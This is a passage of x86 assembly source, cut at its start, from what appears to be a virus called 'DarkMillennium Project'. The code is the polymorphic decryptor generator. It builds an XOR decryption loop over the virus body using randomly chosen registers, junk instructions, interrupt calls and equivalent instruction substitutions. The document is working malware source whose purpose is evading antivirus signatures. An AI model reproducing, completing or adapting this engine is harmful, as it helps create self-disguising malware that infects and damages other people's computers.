	;  xor	reg_3, reg_2
		mov	ax, 3366h
		stosw
		mov	al, byte ptr [ebp + reg_3 - Start]
		mov	ebx, 8
		mul	ebx
		add	al, byte ptr [ebp + reg_2 - Start]
		add	al, 0C0h
		stosb

	;  Generate Junk
		xchg	ebp, edi
		call	GenerateJunk
		xchg	ebp, edi

	;  cmp	reg3, 9090h
		mov	ax, 8166h
		stosw
		mov	al, byte ptr [ebp + reg_3 - Start]
		add	al, 0F8h
		stosb
		mov	ax, 9090h
		stosw

	;  jne -inc reg_2 line-
		mov	al, 75h
		stosb
		mov	eax, [ebp + var1 - Start]
		sub	eax, edi
		dec	eax					;  now JNE points to INC DI line
		stosb

	;  Generate Junk
		xchg	ebp, edi
		call	GenerateJunk
		xchg	ebp, edi

	;  Save the number of register that contain the key for decryption
		mov	al, [ebp + reg_2 - Start]
		mov	[ebp + reg_key - Start], al

		call	GenerateRegisters
		call	GenerateFuckRegs

	;  lea	reg_1, [ebp + key - Start]  ->  key offset will be setted later
		mov	al, 8Dh
		stosb
		mov	al, byte ptr [ebp + reg_1 - Start]
		mov	ebx, 8
		mul	ebx
		add	al, 85h
		stosb

		mov	[ebp + var3 - Start], edi		;  save EDI offset, for later use
		mov	eax, 00000000h
		stosd

	;  Generate Junk
		xchg	ebp, edi
		call	GenerateJunk
		xchg	ebp, edi

	;  add	reg_1, offset Start
		mov	al, 81h
		stosb
		mov	al, byte ptr [ebp + reg_1 - Start]
		add	al, 0C0h
		stosb
		mov	eax, offset Start
		stosd

	;  Generate Junk
		xchg	ebp, edi
		call	GenerateJunk
		xchg	ebp, edi

	;  mov	reg_2, virussize
		mov	cl, byte ptr [ebp + reg_2 - Start]
		mov	ch, 0FFh
		mov	edx, virussize
		mov	ax, 0101h
		xchg	ebp, edi
		call	GenPutX1X2
		xchg	ebp, edi

	;  Generate Junk
		xchg	ebp, edi
		call	GenerateJunk
		xchg	ebp, edi

	;  xor	[reg_1], reg_key
		mov	[ebp + var4 - Start], edi
		mov	ax, 3166h
		stosw
		xor	eax, eax
		mov	al, byte ptr [ebp + reg_key - Start]
		mov	ebx, 8
		mul	ebx
		add	al, byte ptr [ebp + reg_1 - Start]
		stosb

	;  Generate Junk
		xchg	ebp, edi
		call	GenerateJunk
		xchg	ebp, edi

	;  inc	reg_1
		mov	al, 40h
		add	al, byte ptr [ebp + reg_1 - Start]
		stosb

	;  Generate Junk
		xchg	ebp, edi
		call	GenerateJunk
		xchg	ebp, edi

	;  inc	reg_1
		mov	al, 40h
		add	al, byte ptr [ebp + reg_1 - Start]
		stosb

	;  Generate Junk
		xchg	ebp, edi
		call	GenerateJunk
		xchg	ebp, edi

	;  dec	reg_2
		mov	al, 48h
		add	al, byte ptr [ebp + reg_2 - Start]
		stosb

	;  Generate Junk
		xchg	ebp, edi
		call	GenerateJunk
		xchg	ebp, edi

	;  dec	reg_2
		mov	al, 48h
		add	al, byte ptr [ebp + reg_2 - Start]
		stosb

	;  Generate Junk
		xchg	ebp, edi
		call	GenerateJunk
		xchg	ebp, edi

	;  cmp	reg_2, 1
		mov	al, 83h
		stosb
		mov	al, 0F8h
		add	al, byte ptr [ebp + reg_2 - Start]
		stosb
		mov	al, 01
		stosb

	;  jg	-- xor [reg_1], reg_key -- line
		mov	al, 07Fh
		stosb
		mov	ax, [ebp + var4 - Start]
		sub	eax, edi
		dec	eax
		stosb

	;  Generate Junk
		xchg	ebp, edi
		call	GenerateJunk
		xchg	ebp, edi

	;  popad
		mov	al, 61h
		stosb

	;  Generate Junk
		xchg	ebp, edi
		call	GenerateJunk
		xchg	ebp, edi

		;  key word for decryption
		mov	esi, [ebp + var2 - Start]
		lea	eax, key
		mov	byte ptr [esi], al
		mov	esi, [ebp + var3 - Start]
		lea	eax, key
		mov	byte ptr [esi], al
		mov	ax, 9090h
		stosw

		nop
		nop
		nop
		nop
		nop

		;  Generate random junk to fill the space after decryptor
		lea	esi, [ebp + Encr_Code - Start]
		xchg	ebp, edi
fill_junk:	push	esi
		call	GenerateOneByteJunk
		pop	esi
		cmp	ebp, esi
		jl	fill_junk
		xchg	ebp, edi

		xchg	ebp, edi
		ret

var1		dd	0	;  keep location of INC DI line
var2		dd	0	;  keep location of LEA ESI, key instruction + 1
var3		dd	0	;  keep location of the second LEA ESI, key instruction + 1
var4		dd	0	;  keep location of XOR [ESI], DI instruction

GenDecryptor	endp		


;  Init register generator
;
InitRegGenerator	proc
		mov	byte ptr [ebp + reg_1 - Start], 0F0h
		mov	byte ptr [ebp + reg_2 - Start], 0F0h
		mov	byte ptr [ebp + reg_3 - Start], 0F0h
		mov	byte ptr [ebp + reg_key - Start], 0F0h
		mov	byte ptr [ebp + reg_fuck_1 - Start], 0F0h
		mov	byte ptr [ebp + reg_fuck_2 - Start], 0F0h
		ret
InitRegGenerator	endp

;  Generate registers for use in decryptor
;
GenerateRegisters	proc
		pushad

		;  Generate reg, not ESP, not EBP
get_reg_1:	mov	eax, 8
		call	random_in_range
		cmp	al, 4					;  no ESP
		jz	get_reg_1
		cmp	al, 5					;  no EBP
		jz	get_reg_1
		cmp	al, byte ptr [ebp + reg_key - Start]
		jz	get_reg_1
		mov	byte ptr [ebp + reg_1 - Start], al		;  save reg value for later use

		;  Generate reg2, not ESP, not EBP, <> reg1
get_reg_2:	mov	eax, 8
		call	random_in_range
		cmp	al, 4					;  no ESP
		jz	get_reg_2
		cmp	al, 5					;  no EBP
		jz	get_reg_2
		cmp	al, byte ptr [ebp + reg_1 - Start]
		jz	get_reg_2
		cmp	al, byte ptr [ebp + reg_key - Start]
		jz	get_reg_1
		mov	byte ptr [ebp + reg_2 - Start], al

		;  Generate reg3, not ESP, not EBP, <> reg1, <> reg2
get_reg_3:	mov	eax, 8
		call	random_in_range
		cmp	al, 4					;  no ESP
		jz	get_reg_3
		cmp	al, 5					;  no EBP
		jz	get_reg_3
		cmp	al, byte ptr [ebp + reg_1 - Start]
		jz	get_reg_3
		cmp	al, byte ptr [ebp + reg_2 - Start]
		jz	get_reg_3
		cmp	al, byte ptr [ebp + reg_key - Start]
		jz	get_reg_1
		mov	byte ptr [ebp + reg_3 - Start], al

		popad
		ret
GenerateRegisters	endp


;  Generate 2 registers, different from the other registers used
;
GenerateFuckRegs	proc
		pushad
get_reg_fuck_1:
		mov	eax, 8
		call	random_in_range
		cmp	al, 4					;  no ESP
		jz	get_reg_fuck_1
		cmp	al, 5					;  no EBP
		jz	get_reg_fuck_1
		cmp	al, byte ptr [ebp + reg_1 - Start]
		jz	get_reg_fuck_1
		cmp	al, byte ptr [ebp + reg_2 - Start]
		jz	get_reg_fuck_1
		cmp	al, byte ptr [ebp + reg_3 - Start]
		jz	get_reg_fuck_1
		cmp	al, byte ptr [ebp + reg_key - Start]
		jz	get_reg_fuck_1
		mov	byte ptr [ebp + reg_fuck_1 - Start], al

get_reg_fuck_2:
		mov	eax, 15
		call	random_in_range
		cmp	al, 7
		jg	ch_FFh
		cmp	al, 4					;  no ESP
		jz	get_reg_fuck_2
		cmp	al, 5					;  no EBP
		jz	get_reg_fuck_2
		cmp	al, byte ptr [ebp + reg_1 - Start]
		jz	get_reg_fuck_2
		cmp	al, byte ptr [ebp + reg_2 - Start]
		jz	get_reg_fuck_2
		cmp	al, byte ptr [ebp + reg_3 - Start]
		jz	get_reg_fuck_2
		cmp	al, byte ptr [ebp + reg_fuck_1 - Start]
		jz	get_reg_fuck_2
		cmp	al, byte ptr [ebp + reg_key - Start]
		jz	get_reg_fuck_2
		mov	byte ptr [ebp + reg_fuck_2 - Start], al
GenerateFuckRegs_Exit:
		popad
		ret

ch_FFh:	mov	al, 0FFh
		mov	byte ptr [ebp + reg_fuck_2 - Start], al
		jmp	GenerateFuckRegs_Exit

GenerateFuckRegs	endp


;  Generate MOV reg1, reg2/[reg2]/val like instructions
;  EBP = location for code
;  CL = reg1
;  CH = reg2	( if CH = 0FFh then use value from EDX instead of reg2 )
;			( in this case AH value will be ignored, no direct mem read like
;			MOV EAX, [402000h] 'cause I don't use this kind of instructions in my decryptor )
;  AL = type of registry to use	0 = word ( AX, BX ... )
;			1 = dword ( EAX, EBX ... )
;			byte registers are not used in my decryptor
;  AH =	0 use direct value ( EAX ... )
;		1 use memory address from register ( [EAX], [ESI] ... )
;  EDX =	use this value instead of reg2 in case CH = 0FFh
;
GenPutX1X2	proc
		push	eax ecx edx

		lea	eax, [edi + offset GenMovType - Start]
		mov	[edi + MovType - Start], eax
		lea	eax, [edi + offset GenPushPopType - Start]
		mov	[edi + PushPopType - Start], eax
		lea	eax, [edi + offset GenXorAddType - Start]
		mov	[edi + XorAddType - Start], eax
		lea	eax, [edi + offset GenSubAddType - Start]
		mov	[edi + SubAddType - Start], eax

		mov	eax, (offset EndPutX1X2Table - offset PutX1X2Table) / 4
		call	random_in_range
		mov	esi, 4
		mul	esi
		xchg	esi, eax
		add	esi, edi
		add	esi, offset PutX1X2Table - offset Start
		mov	ebx, dword ptr [esi]

		pop	edx ecx eax
		call	ebx
		ret

GenPutX1X2	endp


;  Decryptor Junk instructions
;  EBP = location for junk
GenerateJunk	proc
		lea	eax, [edi + offset GenerateOneByteJunk - Start]
		mov	[edi + OneByteJunk - Start], eax
		lea	eax, [edi + offset GenerateINTs - Start]
		mov	[edi + INTs - Start], eax
		lea	eax, [edi + offset GenNothing - Start]
		mov	[edi + _Nothing - Start], eax
		lea	eax, [edi + offset GenRndPutX1X2 - Start]
		mov	[edi + RndPutX1X2 - Start], eax

		mov	eax, (offset EndRandomJunkTable - offset RandomJunkTable) / 4
		call	random_in_range
		mov	esi, 4
		mul	esi		
		xchg	esi, eax
		add	esi, edi
		add	esi, offset RandomJunkTable - offset Start
		mov	eax, dword ptr [esi]
		call	eax
		ret
GenerateJunk	endp


;  Generate one byte instruction, put it in [EBP] and increase EBP with 1
;  EBP = location for generated code
GenerateOneByteJunk	proc
		lea	esi, [edi + OneByteTable - Start]			; Offset of the table
		mov	eax, offset EndOneByteTable - offset OneByteTable	; size of table
		call	random_in_range					; Must generate random numbers
		add	esi, eax						; Add AX ( AL ) to the offset
		mov	al, byte ptr [esi] 					; Put selected opcode in al
		xchg	ebp, edi
		stosb							; And store it in EDI ( points to
									; the decryptor instructions )
		xchg	ebp, edi
		ret
GenerateOneByteJunk	endp


;  Generate INT calls and increase edi with 2
;  EBP = location for generated code
GenerateINTs	proc
		lea	esi, [edi + INTsTable - Start]
		mov	eax, offset EndINTsTable - offset INTsTable
		call	random_in_range
		add	esi, eax
		mov	ah, byte ptr [esi]
		mov	al, 0CDh
		xchg	ebp, edi
		stosw
		xchg	ebp, edi
		ret
GenerateINTs	endp


;  Generate NOTHING
;  EBP = location for generated code
GenNothing	proc
		ret
GenNothing	endp


;  The same with GenPutX1X2 but with random registers and/or values
;  NOTE : the registers are not the ones that are already in use
GenRndPutX1X2	proc
		xchg	ebp, edi

		; random in EDX
		mov	eax, 0FFFFh
		call	random_in_range
		mov	dx, ax
		shl	edx, 10h
		mov	eax, 0FFFFh
		call	random_in_range
		mov	dx, ax

		;  random types
		mov	eax, 2
		call	random_in_range
		mov	bl, al
		mov	bh, 00h			;  registers like [EAX], [EBX] ... will not be generated, only EAX, EBX ...
							;  'cause it will give Access Violation in most of the cases
		mov	ax, bx

		call	GenerateFuckRegs
		mov	cl, byte ptr [ebp + reg_fuck_1 - Start]
		mov	ch, byte ptr [ebp + reg_fuck_2 - Start]

		xchg	ebp, edi
		call	GenPutX1X2
		ret
GenRndPutX1X2	endp

;  Generate MOV instructions
;  Generate MOV reg1, reg2/[reg2]/val like instructions
;  EBP = location for code
;  CL = reg1
;  CH = reg2	( if CH = 0FFh then use value from EDX instead of reg2 )
;       		( in this case AH value will be ignored, no direct mem read like
;	      	MOV EAX, [402000h] 'cause I don't use this kind of instructions in my decryptor )
;  AL = type of registry to use	0 = word ( AX, BX ... )
;               		1 = dword ( EAX, EBX ... )
;		               	byte registers are not used in my decryptor
;  AH =	0 use direct value ( EAX ... )
;       1 use memory address from register ( [EAX], [ESI] ... )
;  EDX = use this value instead of reg2 in case CH = 0FFh
;
GenMovType	proc
		xchg	ebp, edi

		cmp	ch, 0FFh
		jne	not_val
		jmp	use_val

not_val:	cmp	ch, 04h
		jnz	not_esp
		jmp	mov_esp
not_esp:	cmp	ch, 05h
		jnz	not_ebp
		jmp	mov_ebp

not_ebp:    cmp	al, 0
		jz	word_type
		cmp	al, 1
		jz	dword_type
		jmp	MovType_End

word_type:	;  reg1 = word reg
		cmp	ah, 1
		jz	word_type1

		;  MOV reg1, reg2
		mov	ax, 8B66h
		stosw
		mov	al, cl
		mov	bl, 8
		mul	bl
		add	al, ch
		add	al, 0C0h
		stosb
		jmp	MovType_End

word_type1:	;  MOV reg1, [reg2]
		mov	ax, 8B66h
		stosw
		mov	al, cl
		mov	bl, 8
		mul	bl
		add	al, ch
		stosb
		jmp	MovType_End

dword_type:	;  reg1 = dword reg
		cmp	ah, 1
		jz	dword_type1

		;  MOV reg1, reg2
		mov	al, 08Bh
		stosb
		mov	al, cl
		mov	bl, 8
		mul	bl
		add	al, ch
		add	al, 0C0h
		stosb
		jmp	MovType_End

dword_type1:	;  MOV reg1, [reg2]
		mov	al, 8Bh
		stosb
		mov	al, cl
		mov	bl, 8
		mul	bl
		add	al, ch
		stosb
		jmp	MovType_End

mov_esp:	;  MOV reg1, ESP/[ESP]
		mov	al, 8Bh
		stosb

		cmp	ah, 0
		jz	mov_esp2

		;  MOV reg1, [ESP]
		mov	al, cl
		mov	bl, 8
		mul	bl
		add	al, 04h
		stosb
		mov	al, 24h
		stosb
		jmp	MovType_End

		;  MOV reg1, ESP
mov_esp2:	mov	al, cl
		mov	bl, 8
		mul	bl
		add	al, 0C4h
		stosb
		jmp	MovType_End

mov_ebp:	;  MOV reg1, EBP/[EBP]
		mov	al, 8Bh
		stosb
		cmp	ah, 0
		jz	mov_ebp2

		;  MOV reg1, [EBP]
		mov	al, cl
		mov	bl, 8
		mul	bl
		add	al, 45h
		stosb
		mov	al, 00h
		stosb

		;  MOV reg1, EBP
mov_ebp2:	mov	al, cl
		mov	bl, 8
		mul	bl
		add	al, 0C5h
		stosb
		jmp	MovType_End

MovType_End:	xchg	ebp, edi
		ret

use_val:	cmp	al, 0
		jne	use_val_

		mov	al, 66h
		stosb
		mov	al, 0B8h
		add	al, cl
		stosb
		mov	ax, dx
		stosw
		jmp	MovType_End

use_val_:		mov	al, 0B8h
		add	al, cl
		stosb
		mov	eax, edx
		stosd
		jmp	MovType_End

GenMovType	endp


;  Generate PUSH reg2/[reg2]/val ... POP reg1  ( = MOV reg1, reg2/[reg2]/val )
;  EBP = location for code
;  CL = reg1	(PUSH reg1)
;  CH = reg2	(POP reg2)
;		( if CH = 0FFh then use value from EDX instead of reg2 )
;		( in this case AH value will be ignored, no direct mem read like
;		MOV EAX, [402000h] 'cause I don't use this kind of instructions in my decryptor )
;  AL = type of registry to use	0 = word ( AX, BX ... )
;				1 = dword ( EAX, EBX ... )
;				byte registers are not used in my decryptor
;  AH =	0 use direct value ( EAX ... )
;	1 use memory address from register ( [EAX], [ESI] ... )
;  EDX =	use this value instead of reg2 in case CH = 0FFh
;
GenPushPopType	proc

		xchg	ebp, edi

		cmp	ch, 0FFh
		jnz	not_val_2
		push	ax
		jmp	use_val_2

not_val_2:	push	ax
		cmp	al, 0
		jnz	not_wordreg

		mov	al, 66h
		stosb

not_wordreg:	cmp	ah, 0
		jz	not_ebp_

		cmp	ch, 04h
		jnz	not_esp_
		jmp	push_esp
not_esp_:	cmp	ch, 05h
		jnz	not_ebp_
		jmp	push_ebp

not_ebp_:	cmp	ah, 1
		jz	push_type1

		;  PUSH reg2
		mov	al, 50h
		add	al, ch
		stosb
		jmp	Pop_reg1

push_type1:	;  PUSH [reg2]
		mov	al, 0FFh
		stosb
		mov	al, 30h
		add	al, ch
		stosb

		;  POP reg1
		pop	ax
		cmp	al, 0
		jnz	not_wordreg__

		mov	al, 66h
		stosb

not_wordreg__:	mov	al, 58h
		add	al, cl
		stosb
		jmp	PushPopType_End

push_esp:	;  PUSH [ESP] (reg2)
		mov	ax, 34FFh
		stosw
		mov	al, 24h
		stosb
		jmp	Pop_reg1

push_ebp:	;  PUSH [EBP] (reg2)
		mov	ax, 75FFh
		stosw
		mov	al, 00h
		stosb

Pop_reg1:	;  POP reg1
		pop	ax
		cmp	al, 0
		jnz	not_wordreg_

		mov	al, 66h
		stosb

not_wordreg_:	mov	al, 58h
		add	al, cl
		stosb

PushPopType_End:xchg	ebp, edi
		ret

use_val_2:	cmp	al, 0
		jnz	not_wordreg___

		;  PUSH	val
		mov	ax, 6866h
		stosw
		mov	ax, dx
		stosw
		mov	ch, cl
		jmp	Pop_reg1

not_wordreg___:	mov	al, 68h
		stosb
		mov	eax, edx
		stosd
		pop	ax
		mov	al, 1
		mov	ch, cl
		push	ax
		jmp	Pop_reg1

GenPushPopType	endp


;  Generate XOR reg1, reg1 ... ADD reg1, reg2/[reg2]/val  ( = MOV reg1, reg2/[reg2]/val )
;  EBP = location for code
;  CL = reg1
;  CH = reg2	( if CH = 0FFh then use value from EDX instead of reg2 )
;		( in this case AH value will be ignored, no direct mem read like
;		MOV EAX, [402000h] 'cause I don't use this kind of instructions in my decryptor )
;  AL = type of registry to use	0 = word ( AX, BX ... )
;			1 = dword ( EAX, EBX ... )
;			byte registers are not used in my decryptor
;  AH =	0 use direct value ( EAX ... )
;	1 use memory address from register ( [EAX], [ESI] ... )
;  EDX =	use this value instead of reg2 in case CH = 0FFh
;
GenXorAddType	proc
		xchg	ebp, edi

		cmp	ch, 0FFh
		jnz	not_val_3
		jmp	use_val_3

not_val_3:	push	ax
		cmp	al, 0
		jnz	not_wordreg_2
		jmp	wordreg_2

not_wordreg_2:	;  XOR reg1, reg1
		mov	al, 33h
		stosb
		mov	al, cl
		mov	bl, 9
		mul	bl
		add	al, 0C0h
		stosb

		pop	ax
		cmp	ah, 0
		jz	dwordreg_2

		cmp	ch, 4			; ESP ?
		jz	add_esp
		cmp	ch, 5			; EBP ?
		jz	add_ebp

		;  ADD reg1, [reg2]
		mov	al, 03h
		stosb
		mov	al, cl
		mov	bl, 8
		mul	bl
		add	al, ch
		stosb
		jmp	GenXorAddType_End		

		;  ADD reg1, [ESP]
add_esp:	mov	al, 03h
		stosb
		mov	al, cl
		mov	bl, 9
		mul	bl
		add	al, 04h
		stosb
		mov	al, 24h
		stosb
		jmp	GenSubAddType_End

		;  ADD reg1, [EBP]
add_ebp:	mov	al, 03h
		stosb
		mov	al, cl
		mov	bl, 8
		mul	bl
		add	al, 45h
		stosb
		jmp	GenSubAddType_End

dwordreg_2:	;  ADD	reg1, reg2
		mov	al, 03h
		stosb
		mov	al, cl
		mov	bl, 8
		mul	bl
		add	al, 0C0h
		add	al, ch
		stosb
		jmp	GenXorAddType_End

wordreg_2:	;  XOR reg1, reg1
		mov	ax, 3366h
		stosw
		mov	al, cl
		mov	bl, 9
		mul	bl
		add	al, 0C0h
		stosb

		pop	ax
		cmp	ah, 0
		jz	wordreg_2_

		;  ADD reg1, [reg2]
		mov	ax, 0366h
		stosw
		mov	al, cl
		mov	bl, 8
		mul	bl
		add	al, ch
		stosb
		jmp	GenXorAddType_End

wordreg_2_:	;  ADD reg1, reg2
		mov	ax, 0366h
		stosw
		mov	al, cl
		mov	bl, 8
		mul	bl
		add	al, 0C0h
		add	al, ch
		stosb
		jmp	GenXorAddType_End

use_val_3:	;  XOR reg1, reg1
		mov	al, 33h
		stosb
		mov	al, cl
		mov	bl, 9
		mul	bl
		add	al, 0C0h
		stosb

		;  ADD reg1, val
		mov	al, 81h
		stosb
		mov	al, 0C0h
		add	al, cl
		stosb
		mov	eax, edx
		stosd

GenXorAddType_End:
		xchg	ebp, edi
		ret

GenXorAddType	endp


;  Generate SUB reg1, reg1 ... ADD reg1, reg2/[reg2]/val
;  EBP = location for code
;  CL = reg1
;  CH = reg2	( if CH = 0FFh then use value from EDX instead of reg2 )
;		( in this case AH value will be ignored, no direct mem read like
;		MOV EAX, [402000h] 'cause I don't use this kind of instructions in my decryptor )
;  AL = type of registry to use	0 = word ( AX, BX ... )
;				1 = dword ( EAX, EBX ... )
;				byte registers are not used in my decryptor
;  AH =	0 use direct value ( EAX ... )
;	1 use memory address from register ( [EAX], [ESI] ... )
;  EDX =	use this value instead of reg2 in case CH = 0FFh
;
GenSubAddType	proc
		xchg	ebp, edi

		cmp	ch, 0FFh
		jnz	not_val_4
		jmp	use_val_4

not_val_4:	push	ax
		cmp	al, 0
		jnz	not_wordreg_3
		jmp	wordreg_3

not_wordreg_3:	;  SUB reg1, reg1
		mov	al, 2Bh
		stosb
		mov	al, cl
		mov	bl, 9
		mul	bl
		add	al, 0C0h
		stosb

		pop	ax
		cmp	ah, 0
		jz	dwordreg_3

		cmp	ch, 4			; ESP ?
		jz	add_esp_
		cmp	ch, 5			; EBP ?
		jz	add_ebp_

		;  ADD reg1, [reg2]
		mov	al, 03h
		stosb
		mov	al, cl
		mov	bl, 8
		mul	bl
		add	al, ch
		stosb
		jmp	GenSubAddType_End

		;  ADD reg1, [ESP]
add_esp_:	mov	al, 03h
		stosb
		mov	al, cl
		mov	bl, 9
		mul	bl
		add	al, 04h
		stosb
		mov	al, 24h
		stosb
		jmp	GenSubAddType_End

		;  ADD reg1, [EBP]
add_ebp_:	mov	al, 03h
		stosb
		mov	al, cl
		mov	bl, 8
		mul	bl
		add	al, 45h
		stosb
		jmp	GenSubAddType_End

dwordreg_3:	;  ADD	reg1, reg2
		mov	al, 03h
		stosb
		mov	al, cl
		mov	bl, 8
		mul	bl
		add	al, 0C0h
		add	al, ch
		stosb
		jmp	GenSubAddType_End

wordreg_3:	;  SUB reg1, reg1
		mov	ax, 2B66h
		stosw
		mov	al, cl
		mov	bl, 9
		mul	bl
		add	al, 0C0h
		stosb

		pop	ax
		cmp	ah, 0
		jz	wordreg_3_

		;  ADD reg1, [reg2]
		mov	ax, 0366h
		stosw
		mov	al, cl
		mov	bl, 8
		mul	bl
		add	al, ch
		stosb
		jmp	GenSubAddType_End

wordreg_3_:	;  ADD reg1, reg2
		mov	ax, 0366h
		stosw
		mov	al, cl
		mov	bl, 8
		mul	bl
		add	al, 0C0h
		add	al, ch
		stosb
		jmp	GenSubAddType_End

use_val_4:	;  SUB reg1, reg1
		mov	al, 2Bh
		stosb
		mov	al, cl
		mov	bl, 9
		mul	bl
		add	al, 0C0h
		stosb

		;  ADD reg1, val
		mov	al, 81h
		stosb
		mov	al, 0C0h
		add	al, cl
		stosb
		mov	eax, edx
		stosd

GenSubAddType_End:
		xchg	ebp, edi
		ret
GenSubAddType	endp

;  Return a random number in AX, between 0 and AX-1
random_in_range	proc
		push	bx dx
		xchg	ax, bx
		call	get_rnd
		xor	dx, dx
		div	bx
		xchg	ax, dx
		pop	dx bx
		ret
random_in_range	endp


;  Tables

RandomJunkTable:	
	OneByteJunk		dd	offset GenerateOneByteJunk
	INTs			dd	offset GenerateINTs
	_Nothing		dd	offset GenNothing
	RndPutX1X2		dd	offset GenRndPutX1X2
EndRandomJunkTable:

OneByteTable:	db	090h			; nop
		db	0F8h			; clc
		db	0F9h			; stc
		db	0F5h			; cmc
;		db	0CCh			; int 3h
;		db	098h			; cbw
;		db	099h			; cwd
EndOneByteTable:

INTsTable:	;db	01h
		db	08h
		db	0Ah
		db	0Bh
		db	0Ch
;		db	0Dh
		db	0Eh
		db	0Fh
;		db	1Ch
		db	28h
		db	2Bh
		db	2Ch
		db	2Dh
		db	70h
		db	71h
		db	72h
		db	73h
		db	74h
;		db	75h
		db	76h
		db	77h
; those with ; before'em will generate an error (ussualy a blue screen)

EndINTsTable:

PutX1X2Table:
	MovType		dd	offset GenMovType
	PushPopType	      dd	offset GenPushPopType
	XorAddType	      dd	offset GenXorAddType
	SubAddType	      dd	offset GenSubAddType
EndPutX1X2Table:

regsTable:
	reg_1		db	0
	reg_2		db	0
	reg_3		db	0
	reg_key	db	0
	reg_fuck_1	db	0
	reg_fuck_2	db	0
regsTableEnd:

_end:

gfx_buffer		db	10Dh dup (0)
_end_2:

w_title		db	'DarkMillennium Project', 0

		end	Begin
		end
